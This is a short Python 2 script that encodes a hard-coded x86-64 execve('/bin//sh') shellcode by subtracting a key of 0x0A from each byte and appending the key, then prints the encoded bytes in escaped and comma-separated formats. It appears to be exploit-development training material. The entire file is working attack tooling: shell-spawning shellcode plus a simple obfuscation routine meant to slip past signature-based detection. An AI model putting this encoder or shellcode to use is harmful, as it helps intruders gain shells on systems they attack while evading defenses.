#!/usr/bin/python
import sys
key = 0x0A
shellcode = ("\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05")
encoded = ""
encoded2 = ""
for x in bytearray(shellcode) :
        y = (x - key)
        encoded += '\\x%02x' % (y & 0xff)
        encoded2 += '0x%02x,' % (y & 0xff)
encoded += '\\x%02x' % key
encoded2 += '0x%02x' % key
print "Encoded shellcode (len %d):" % len(bytearray(shellcode))
print encoded
print "\nShellcode converted to ASM format (len %d):" % len(bytearray(shellcode))
print encoded2
